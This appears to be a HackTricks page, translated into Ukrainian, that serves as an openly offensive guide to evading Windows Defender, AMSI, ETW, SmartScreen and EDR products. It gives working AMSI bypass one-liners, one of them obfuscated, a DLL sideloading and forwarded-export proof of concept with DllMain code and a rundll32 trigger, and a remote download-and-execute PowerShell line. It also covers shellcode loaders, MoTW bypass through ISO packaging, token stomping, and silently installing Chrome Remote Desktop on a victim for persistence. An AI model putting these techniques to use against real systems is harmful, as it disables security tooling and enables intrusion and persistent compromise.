# Обхід антивірусів (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Цю сторінку написав** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Зупинити Defender

- [defendnot](https://github.com/es3n1n/defendnot): Інструмент для припинення роботи Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Інструмент, що припиняє роботу Windows Defender, імітуючи інший AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Наразі AV використовують різні методи перевірки, чи є файл шкідливим: static detection, dynamic analysis та, для просунутих EDR, behavioural analysis.

### **Static detection**

Static detection досягається шляхом позначення відомих шкідливих рядків або масивів байтів у бінарному файлі чи скрипті, а також вилучення інформації з самого файлу (наприклад, опис файлу, назва компанії, цифрові підписи, іконка, контрольна сума тощо). Це означає, що використання відомих публічних інструментів може призвести до виявлення, оскільки їх, ймовірно, вже проаналізували і позначили як шкідливі. Є кілька способів обійти цей тип детекції:

- **Encryption**

Якщо зашифрувати бінарник, AV не зможе його виявити, але вам знадобиться якийсь лоадер, щоб розшифрувати та виконати програму в пам'яті.

- **Obfuscation**

Іноді достатньо змінити деякі рядки у бінарному файлі або скрипті, щоб оминути AV, але це може зайняти багато часу залежно від того, що саме ви намагаєтесь обфускувати.

- **Custom tooling**

Якщо ви розробляєте власні інструменти, відомих "поганих" сігнатур не буде, але це вимагає багато часу та зусиль.

> [!TIP]
> Хороший спосіб перевірки на static detection Windows Defender — [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Він фактично розбиває файл на кілька сегментів і змушує Defender просканувати кожен окремо; таким чином можна точно дізнатись, які рядки або байти у вашому бінарнику позначені.

Раджу переглянути цей [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) про практичний AV Evasion.

### **Dynamic analysis**

Dynamic analysis — це коли AV запускає ваш бінар у sandbox і спостерігає за шкідливою активністю (наприклад, спроби розшифрувати й прочитати паролі браузера, виконати minidump на LSASS тощо). Ця частина може бути складнішою для обходу, але ось кілька прийомів, які допоможуть обійти sandboxes.

- **Sleep before execution** Залежно від реалізації, це може бути чудовим способом обійти dynamic analysis AV. AV мають дуже короткий час на сканування файлів, щоб не переривати роботу користувача, тому довгі затримки (sleep) можуть порушити аналіз бінарників. Проблема в тому, що багато sandbox'ів можуть просто пропустити sleep залежно від реалізації.
- **Checking machine's resources** Зазвичай sandboxes мають дуже обмежені ресурси (наприклад, < 2GB RAM), інакше вони можуть уповільнити машину користувача. Тут можна бути креативним — наприклад, перевіряти температуру CPU чи швидкість вентиляторів; не все буде реалізовано в пісочниці.
- **Machine-specific checks** Якщо ви таргетуєте користувача, чия робоча станція приєднана до домену "contoso.local", ви можете перевірити домен комп'ютера і, якщо він не співпадає, завершити роботу програми.

Виявилося, що computername Sandbox Microsoft Defender — HAL9TH, тож ви можете перевіряти ім'я комп'ютера у вашому malware перед детонацією: якщо ім'я збігається з HAL9TH, це означає, що ви в sandbox'і Defender, і можна завершити виконання програми.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>джерело: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Ще кілька дуже корисних порад від [@mgeeky](https://twitter.com/mariuszbit) щодо роботи проти Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev канал</p></figcaption></figure>

Як уже згадувалося, **публічні інструменти** рано чи пізно **будуть виявлені**, тож варто поставити собі питання:

Наприклад, якщо ви хочете дампити LSASS, **чи справді потрібно використовувати mimikatz**? Чи можна скористатися іншим, менш відомим проектом, який також дампить LSASS.

Правильна відповідь — ймовірно, остання. Візьмемо mimikatz як приклад: це, мабуть, один з найчастіше помічених AV та EDR інструментів; сам проект класний, але його важко адаптувати для обходу AV, тому просто шукайте альтернативи для досягнення вашої мети.

> [!TIP]
> Під час модифікації payload'ів для евазії переконайтеся, що **вимкнули автоматичну відправку зразків** у Defender, і, серйозно, **НЕ ЗАВАНТАЖУЙТЕ НА VIRUSTOTAL**, якщо ваша мета — довготривала евазія. Якщо ви хочете перевірити, чи виявить конкретний AV ваш payload, встановіть його на VM, спробуйте вимкнути автоматичну відправку зразків і тестуйте там, доки не будете задоволені результатом.

## EXEs vs DLLs

Коли можливо, завжди **віддавайте перевагу використанню DLL для евазії** — з мого досвіду, DLL-файли зазвичай **набагато менше виявляються** і аналізуються, тож це простий трюк, щоб уникнути детекції в деяких випадках (за умови, що ваш payload можна виконати як DLL).

Як видно на цьому зображенні, DLL Payload від Havoc має рейтинг виявлення 4/26 на antiscan.me, тоді як EXE payload має 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Порівняння на antiscan.me: звичайний Havoc EXE payload vs звичайний Havoc DLL</p></figcaption></figure>

Тепер покажемо кілька трюків з DLL-файлами, щоб бути значно більш прихованими.

## DLL Sideloading & Proxying

**DLL Sideloading** використовує порядок пошуку DLL, який застосовує loader, розташовуючи вразливе застосування і шкідливі payload'и поруч.

Можна перевірити програми, вразливі до DLL Sideloading, за допомогою [Siofra](https://github.com/Cybereason/siofra) та наступного powershell скрипта:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ця команда виведе список програм, вразливих до DLL hijacking всередині "C:\Program Files\\" та DLL файлів, які вони намагаються завантажити.

Я настійно рекомендую вам **вивчіть DLL Hijackable/Sideloadable програми самостійно**, ця техніка досить прихована при правильному виконанні, але якщо ви використовуєте публічно відомі DLL Sideloadable програми, вас можуть легко викрити.

Просто розмістивши шкідливий DLL з іменем, яке програма очікує завантажити, не призведе до виконання вашого payload, оскільки програма очікує певні функції всередині цього DLL; щоб вирішити цю проблему, ми використаємо іншу техніку під назвою **DLL Proxying/Forwarding**.

**DLL Proxying** переспрямовує виклики, які програма робить із проксі (та шкідливого) DLL до оригінального DLL, зберігаючи функціональність програми та дозволяючи обробляти виконання вашого payload.

Я буду використовувати проєкт [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) від [@flangvik](https://twitter.com/Flangvik/)

Ось кроки, які я виконав:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Остання команда дасть нам 2 файли: шаблон вихідного коду DLL та оригінальний перейменований DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Обидва наші shellcode (закодований за допомогою [SGN](https://github.com/EgeBalci/sgn)) і proxy DLL мають рівень виявлення 0/26 на [antiscan.me](https://antiscan.me)! Я назвав би це успіхом.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Я **вкрай рекомендую** переглянути [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) про DLL Sideloading, а також [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), щоб детальніше вивчити те, що ми обговорювали.

### Зловживання Forwarded Exports (ForwardSideLoading)

Модулі Windows PE можуть експортувати функції, які фактично є "forwarders": замість посилання на код запис експорту містить ASCII-рядок у форматі `TargetDll.TargetFunc`. Коли викликач розв'язує експорт, завантажувач Windows буде:

- Завантажити `TargetDll`, якщо він ще не завантажений
- Визначити `TargetFunc` у ньому

Ключові особливості для розуміння:
- Якщо `TargetDll` є KnownDLL, він постачається з захищеного простору імен KnownDLLs (наприклад, ntdll, kernelbase, ole32).
- Якщо `TargetDll` не є KnownDLL, використовується звичайний порядок пошуку DLL, який включає директорію модуля, що виконує розв'язання переадресованих експортів.

Це відкриває примітив для непрямого sideloading: знайти підписану DLL, яка експортує функцію, переадресовану на ім'я модуля, що не є KnownDLL, а потім розмістити цю підписану DLL поруч із керованою нападником DLL, яка має точно таке ж ім'я, як цільовий перенаправлений модуль. Коли викликається переадресований експорт, завантажувач розв'язує форвард і завантажує вашу DLL з тієї ж директорії, виконуючи ваш DllMain.

Приклад, спостережений у Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` не є KnownDLL, тому вона завантажується згідно зі звичайним порядком пошуку.

PoC (copy-paste):
1) Скопіюйте підписану системну DLL у папку, доступну для запису
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Помістіть шкідливий `NCRYPTPROV.dll` у ту ж папку. Мінімальний DllMain достатній для отримання виконання коду; вам не потрібно реалізовувати переадресовану функцію, щоб викликати DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Спровокуйте пересилання за допомогою підписаного LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (підписаний) завантажує side-by-side `keyiso.dll` (підписаний)
- Під час розв'язування `KeyIsoSetAuditingInterface` завантажувач переходить за переадресацією до `NCRYPTPROV.SetAuditingInterface`
- Завантажувач потім завантажує `NCRYPTPROV.dll` з `C:\test` і виконує її `DllMain`
- Якщо `SetAuditingInterface` не реалізовано, ви отримаєте помилку "missing API" лише після того, як `DllMain` уже виконався

Hunting tips:
- Зосередьтесь на forwarded exports, де цільовий модуль не є KnownDLL. KnownDLLs перелічені за адресою `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Ви можете перерахувати forwarded exports за допомогою інструментів, таких як:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Перегляньте Windows 11 forwarder inventory, щоб знайти кандидатів: https://hexacorn.com/d/apis_fwd.txt

Ідеї щодо виявлення/захисту:
- Моніторити LOLBins (e.g., rundll32.exe), що завантажують підписані DLL з не-системних шляхів, після чого завантажують non-KnownDLLs з тією ж базовою назвою з цього каталогу
- Генерувати оповіщення для ланцюжків процесів/модулів, таких як: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` у шляхах, доступних для запису користувачем
- Застосовуйте політики цілісності коду (WDAC/AppLocker) та забороняйте write+execute у каталогах додатків

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Ви можете використовувати Freeze, щоб завантажити та виконати ваш shellcode приховано.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ухилення — це гра в кішки та миші: те, що працює сьогодні, може бути виявлено завтра, тому не покладайтеся лише на один інструмент; якщо можливо, комбінуйте кілька технік обходу.

## AMSI (Anti-Malware Scan Interface)

AMSI було створено для запобігання "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Спочатку AVs могли сканувати лише **файли на диску**, тож якщо ви якимось чином могли виконати payloads **безпосередньо в пам'яті**, AVs нічого не могли вдіяти, бо не мали достатньої видимості.

Функція AMSI інтегрована в такі компоненти Windows.

- User Account Control, або UAC (підвищення прав для EXE, COM, MSI або інсталяції ActiveX)
- PowerShell (скрипти, інтерактивне використання та динамічна оцінка коду)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Вона дозволяє антивірусним рішенням інспектувати поведінку скриптів, надаючи вміст скриптів у незашифрованому та необфусцованому вигляді.

Запуск `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` спричинить таке сповіщення у Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, як воно додає префікс `amsi:`, а потім шлях до виконуваного файлу, з якого запущено скрипт, у цьому випадку — powershell.exe.

Ми не записували файл на диск, але все одно були виявлені в пам'яті через AMSI.

Більше того, починаючи з **.NET 4.8**, C# код також проходить через AMSI. Це навіть впливає на `Assembly.Load(byte[])`, що використовується для виконання в пам'яті. Тому для виконання в пам'яті, якщо хочете обійти AMSI, рекомендується використовувати більш ранні версії .NET (наприклад 4.7.2 або нижче).

Існує кілька способів обійти AMSI:

- **Obfuscation**

Оскільки AMSI в основному працює зі статичними детекціями, модифікація скриптів, які ви намагаєтеся завантажити, може бути хорошим способом уникнути виявлення.

Однак AMSI здатний деобфускувати скрипти навіть при наявності кількох шарів обфускації, тому обфускація може не спрацювати залежно від того, як вона виконана. Це ускладнює обхід. Хоча іноді достатньо змінити кілька імен змінних, і проблем не буде, тож усе залежить від того, наскільки сильно щось було помічено.

- **AMSI Bypass**

Оскільки AMSI реалізовано шляхом завантаження DLL у процес powershell (а також cscript.exe, wscript.exe тощо), його можна відносно легко модифікувати навіть при запуску з правами звичайного користувача. Через цю помилку в реалізації AMSI дослідники знайшли кілька способів обійти сканування AMSI.

**Forcing an Error**

Примусове невдале ініціалізація AMSI (amsiInitFailed) призведе до того, що для поточного процесу сканування не відбудеться. Спочатку це розкрив [Matt Graeber](https://twitter.com/mattifestation), і Microsoft розробила сигнатуру, щоб обмежити широке використання.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Все, що було потрібно — один рядок коду powershell, щоб зробити AMSI непридатним для поточного процесу powershell. Цей рядок, звісно, був позначений самим AMSI, тому потрібно внести деякі зміни, щоб застосувати цю техніку.

Ось змінений AMSI bypass, який я взяв з цього [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Майте на увазі, що це, ймовірно, буде помічено після публікації цього допису, тому не слід публікувати код, якщо ваша мета — залишитись непоміченим.

**Memory Patching**

Цю техніку спочатку виявив [@RastaMouse](https://twitter.com/_RastaMouse/) і вона полягає у знаходженні адреси функції "AmsiScanBuffer" в amsi.dll (відповідальної за сканування введених користувачем даних) та перезаписі її інструкціями, які повертають код E_INVALIDARG. Таким чином результат реального сканування поверне 0, що інтерпретується як чистий результат.

> [!TIP]
> Будь ласка, прочитайте [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) для детальнішого пояснення.

Існує також багато інших методів обходу AMSI за допомогою powershell, перегляньте [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) та [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), щоб дізнатися більше про них.

Цей інструмент [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) також генерує скрипт для обходу AMSI.

**Remove the detected signature**

Ви можете використати інструмент, такий як **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** та **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, щоб видалити виявлений підпис AMSI з пам'яті поточного процесу. Цей інструмент працює шляхом сканування пам'яті поточного процесу на наявність підпису AMSI, а потім перезаписує його інструкціями NOP, фактично видаляючи його з пам'яті.

**AV/EDR продукти, які використовують AMSI**

Список AV/EDR продуктів, які використовують AMSI, можна знайти в **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Використовуйте Powershell версії 2**
Якщо ви використовуєте PowerShell версії 2, AMSI не буде завантажено, тому ви зможете запускати свої скрипти без сканування AMSI. Ви можете зробити це:
```bash
powershell.exe -version 2
```
## Журналіювання PowerShell

PowerShell logging — це функція, яка дозволяє логувати всі PowerShell-команди, виконані в системі. Це корисно для аудиту та усунення несправностей, але також може стати **проблемою для зловмисників, які хочуть ухилитися від виявлення**.

Щоб обійти журналіювання PowerShell, можна використати такі методи:

- **Disable PowerShell Transcription and Module Logging**: для цього можна скористатися інструментом, наприклад [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Use Powershell version 2**: якщо використовувати PowerShell версії 2, AMSI не буде завантажено, тож ви зможете запускати скрипти без сканування AMSI. Можна виконати: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: скористайтеся [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) щоб запустити powershell без захисту (саме це використовує `powerpick` з Cobal Strike).

## Обфускація

> [!TIP]
> Декілька технік обфускації покладаються на шифрування даних, що підвищує ентропію бінарного файлу й полегшує його виявлення AV та EDR. Будьте обережні з цим і, можливо, застосовуйте шифрування лише до конкретних секцій коду, які є чутливими або потребують приховування.

### Деобфускація .NET-бінарів, захищених ConfuserEx

При аналізі malware, що використовує ConfuserEx 2 (або комерційні форки), часто зустрічаються кілька рівнів захисту, які блокують декомпілятори та sandboxes. Наведений нижче робочий процес надійно **відновлює майже оригінальний IL**, який потім можна декомпілювати в C# за допомогою dnSpy або ILSpy.

1.  Видалення anti-tampering – ConfuserEx шифрує кожне *method body* і дешифрує його всередині статичного конструктора модуля (`<Module>.cctor`). Це також патчує PE checksum, тому будь-яка модифікація приведе до краху бінарника. Використайте **AntiTamperKiller**, щоб знайти зашифровані таблиці метаданих, відновити XOR-ключі та переписати чисту збірку:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Вивід містить 6 параметрів anti-tamper (`key0-key3`, `nameHash`, `internKey`), які можуть бути корисні при створенні власного unpacker'а.

2.  Відновлення символів / керування потоком – передайте *чистий* файл у **de4dot-cex** (форк de4dot, що розуміє ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – вибір профілю ConfuserEx 2  
• de4dot скасує control-flow flattening, відновить оригінальні простори імен, класи та імена змінних, а також дешифрує константні рядки.

3.  Видалення proxy-викликів – ConfuserEx замінює прямі виклики методів на легкі обгортки (так звані *proxy calls*), щоб ще більше ускладнити декомпіляцію. Видаліть їх за допомогою **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Після цього кроку ви повинні побачити звичні .NET API, такі як `Convert.FromBase64String` або `AES.Create()` замість непрозорих wrapper-функцій (`Class8.smethod_10`, …).

4.  Ручне прибирання – запустіть отриманий бінарник у dnSpy, пошукайте великі Base64-блоки або використання `RijndaelManaged`/`TripleDESCryptoServiceProvider`, щоб знайти *реальний* payload. Часто malware зберігає його як TLV-кодований масив байтів, ініціалізований всередині `<Module>.byte_0`.

Наведена ланцюжок відновлює flow виконання **без** необхідності запускати шкідливий зразок — корисно при роботі на офлайн-станції.

🛈  ConfuserEx створює власний атрибут з іменем `ConfusedByAttribute`, який можна використовувати як IOC для автоматичного тріажу зразків.

#### Однолайнер
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Мета цього проєкту — надати відкритий форк [LLVM](http://www.llvm.org/) компіляційного набору, який може забезпечити підвищену безпеку програмного забезпечення через [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) та tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator демонструє, як використовувати мову `C++11/14` для генерації під час компіляції obfuscated code без використання зовнішніх інструментів і без модифікації компілятора.
- [**obfy**](https://github.com/fritzone/obfy): Додає шар obfuscated operations, згенерованих за допомогою C++ template metaprogramming framework, що ускладнить життя тому, хто захоче crack the application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz — це x64 binary obfuscator, який здатний обфускувати різні PE файли, включно з: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame — простий metamorphic code engine для довільних виконуваних файлів.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator — це тонкоґранічний code obfuscation framework для мов, що підтримуються LLVM, який використовує ROP (return-oriented programming). ROPfuscator обфускує програму на рівні assembly коду, перетворюючи звичайні інструкції в ROP chains, підривши наше природне уявлення про нормальний контрольний потік.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt — це .NET PE Crypter, написаний на Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor здатний конвертувати існуючі EXE/DLL у shellcode і потім його завантажити

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка Zone.Identifier ADS для файлу, завантаженого з інтернету.</p></figcaption></figure>

> [!TIP]
> Важливо зазначити, що виконувані файли, підписані **довіреним сертифікатом підпису**, **не викликатимуть спрацьовування SmartScreen**.

Дуже ефективний спосіб запобігти отриманню Mark of The Web вашими payloads — упакувати їх у якийсь контейнер, наприклад ISO. Це відбувається тому, що Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — інструмент, який пакує payloads у вихідні контейнери для обходу Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм логування у Windows, який дозволяє додаткам та компонентам системи **реєструвати події**. Однак його також можуть використовувати продукти безпеки для моніторингу та виявлення шкідливої активності.

Подібно до того, як обходять AMSI, також можливо змусити функцію користувацького простору `EtwEventWrite` повертатися одразу, не реєструючи події. Це робиться шляхом патчу функції в пам'яті, внаслідок чого ETW-логування для цього процесу ефективно вимикається.

Детальніше — в **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Завантаження C# бінарників у пам'ять відоме вже давно і досі є відмінним способом запуску post-exploitation інструментів без запису на диск і уникаючи виявлення AV.

Оскільки payload завантажується безпосередньо в пам'ять без торкання диска, нам доведеться турбуватися лише про патчинг AMSI для всього процесу.

Більшість C2 фреймворків (sliver, Covenant, metasploit, CobaltStrike, Havoc тощо) вже дозволяють виконувати C# assemblies прямо в пам'яті, але існують різні підходи для цього:

- **Fork\&Run**

Це передбачає **створення нового пожертвуваного процесу**, інжекцію вашого post-exploitation шкідливого коду в цей новий процес, виконання коду та знищення процесу після завершення. Це має свої переваги й недоліки. Перевага методу fork and run у тому, що виконання відбувається **поза** нашим Beacon implant процесом. Це означає, що якщо щось піде не так або буде виявлено під час post-exploitation дій, існує **набагато вища ймовірність** того, що наш **implant виживе.** Недоліком є **вища ймовірність** бути виявленим за допомогою **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Це про інжекцію post-exploitation шкідливого коду **у власний процес**. Таким чином можна уникнути створення нового процесу і його сканування AV, але недолік у тому, що якщо щось піде не так під час виконання payload, існує **набагато вища ймовірність** **втрати вашого beacon**, оскільки процес може впасти.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Якщо хочете дізнатися більше про завантаження C# Assembly, перегляньте цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) та їх InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Ви також можете завантажувати C# Assemblies **from PowerShell**, дивіться [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) та відео S3cur3th1sSh1t ([https://www.youtube.com/watch?v=oe11Q-3Akuk](https://www.youtube.com/watch?v=oe11Q-3Akuk)).

## Використання інших мов програмування

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), можливо виконувати шкідливий код іншими мовами, даючи скомпрометованій машині доступ **до середовища інтерпретатора, встановленого на Attacker Controlled SMB share**.

Надавши доступ до Interpreter Binaries та оточення на SMB share, ви можете **виконувати довільний код цими мовами в пам'яті** скомпрометованої машини.

Репозиторій зазначає: Defender все ще сканує скрипти, але використовуючи Go, Java, PHP тощо, ми маємо **більше гнучкості для обходу статичних сигнатур**. Тестування з випадковими необфусцованими reverse shell скриптами на цих мовах показало успішні результати.

## TokenStomping

Token stomping — це техніка, яка дозволяє нападнику **маніпулювати access token або процесом безпеки, наприклад EDR або AV**, зменшуючи його привілеї так, щоб процес не завершився, але не мав прав для перевірки шкідливої активності.

Щоб запобігти цьому, Windows міг би **забороняти зовнішнім процесам** отримувати дескриптори токенів процесів безпеки.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Використання довіреного ПО

### Chrome Remote Desktop

Як описано в [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), легко встановити Chrome Remote Desktop на ПК жертви і використовувати його для takeover та підтримки persistence:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin without using the GUI).

## Advanced Evasion

Evasion — дуже складна тема, іноді потрібно брати до уваги багато джерел телеметрії в одній системі, тому практично неможливо залишатися повністю непоміченим у зрілих середовищах.

